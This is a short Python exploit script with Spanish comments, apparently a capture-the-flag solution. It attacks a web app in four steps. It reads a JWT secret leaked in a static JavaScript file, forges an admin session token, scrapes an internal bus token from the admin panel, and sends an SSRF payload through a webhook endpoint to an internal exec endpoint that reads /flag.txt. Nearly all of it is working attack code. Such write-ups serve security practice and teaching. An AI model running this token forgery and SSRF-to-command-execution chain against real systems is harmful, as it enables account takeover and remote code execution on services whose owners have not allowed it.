import sys, re, datetime
import jwt, requests

PORT = int(sys.argv[1])
B = "http://172.170.10.11:%d" % PORT

# 1) source leak -> jwt secret
js = requests.get(B + "/static/app.js", timeout=8).text
secret = re.search(r'jwt_secret\s*=\s*"([^"]+)"', js).group(1)
print("1) jwt_secret:", secret)

# 2) forjar JWT admin
tok = jwt.encode({"user": "admin", "role": "admin",
                  "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=2)},
                 secret, algorithm="HS256")
cookies = {"session_token": tok}
r = requests.get(B + "/panel/integraciones", cookies=cookies, timeout=8)
print("2) panel admin:", r.status_code)

# 3) token del bus interno
tag = re.search(r'<input[^>]*id="busToken"[^>]*>', r.text).group(0)
bus = re.search(r'value="([^"]+)"', tag).group(1)
print("3) bus token:", bus)

# 4) SSRF -> RCE en el bus interno
r = requests.post(B + "/api/v1/webhook", cookies=cookies, timeout=10,
                  json={"url": "http://127.0.0.1:8080/exec?cmd=cat%20/flag.txt",
                        "headers": {"X-Internal-Token": bus}})
print("4) RCE ->", r.text.strip()[:200])
m = re.search(r"RP\{[^}]*\}", r.text)
print("FLAG:", m.group(0) if m else "(no encontrada)")
